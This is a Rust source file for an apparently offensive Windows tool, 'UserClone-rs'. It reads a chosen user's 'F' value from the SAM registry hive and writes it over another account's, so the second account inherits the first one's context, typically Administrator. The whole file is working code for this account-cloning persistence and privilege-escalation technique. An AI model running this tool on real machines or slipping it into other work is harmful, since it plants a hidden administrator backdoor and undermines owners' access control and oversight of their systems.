use windows::Win32::System::Registry::KEY_ALL_ACCESS;
use winreg::{RegKey, enums::HKEY_LOCAL_MACHINE, RegValue};
use std::{env};
use std::process::Command;
use std::str::FromStr;
fn main() {

    let args: Vec<String> = env::args().collect();

    let mut user1 = "";
    let mut user2 = "";

    if args.len()==1{
        println!("*UserClone-rs v0.01*");
        println!("\t Usage UserClone.exe Administrator test");
        println!("\t Copy Administrator user context to test user");
        
        return 
    }else if args.len()==3{
        if(&args[1]=="-h"){
            println!("*UserClone-rs v0.01*");
        println!("\t Usage UserClone.exe Administrator test");
        println!("\t Copy Administrator user context to test user");
            return 
        }else{
            user1 = &args[1];
            user2 = &args[2];
        }
    }else{
        println!("*UserClone-rs v0.01*");
        println!("\t Usage UserClone.exe Administrator test");
        println!("\t Copy Administrator user context to test user");
        return 
    }


    let user1_sid = get_sid_dec_from_cmd(user1);
    let user2_sid = get_sid_dec_from_cmd(user2);
    println!("User1 sid :{}\tUser2 sid :{}",user1_sid,user2_sid);
    let user1_F = get_user_sid_key_F(user1_sid);
    println!("{} F :{:?}",user1,user1_F.bytes);
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let users = hklm.open_subkey_with_flags("SAM\\SAM\\Domains\\Account\\Users",KEY_ALL_ACCESS.0).unwrap();

    let user2 = users.open_subkey_with_flags(user2_sid,KEY_ALL_ACCESS.0).unwrap();

    match  user2.set_raw_value("F", &user1_F){
        Ok(_) => println!("success!"),
        Err(err) => println!("{:?}",err),
    }




}

fn get_sid_dec_from_cmd(user:&str)->String{
    let result = Command::new("REG").arg("QUERY").arg(format!("HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\{}",user)).arg("/z").output().expect("REG QUERY exec error!");
    let output_str = String::from_utf8_lossy(&result.stdout).to_string();
    let split_cmd = output_str.split(" ");
    let mut cmd_real:Vec<&str> = vec![];
    for i in split_cmd{
        if i!=""{
            cmd_real.push(i);
        }
    }
    if cmd_real.len()<3{
        println!("you'r always need a higher privilege to run this ^-^");
        panic!("Permission Deny! run as a higher privilege!");
    }
    let sid_dec:u32 = FromStr::from_str(&cmd_real[3][1..cmd_real[3].len() - 1]).expect(&format!("{} sid to dec failed",user));
    let sid_hex = format!("{:#010X}", sid_dec).split("x").nth(1).expect(&format!("{} sid dec to hex failed!",user)).to_string();

    return sid_hex
}

pub fn get_user_sid_key_F(user_sid:String)->RegValue{

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let users = hklm.open_subkey("SAM\\SAM\\Domains\\Account\\Users").expect("open subkey failed");

    let user = users.open_subkey(user_sid).expect("open subkey failed");

    let F = user.get_raw_value("F").expect("get raw value failed");

    return F
}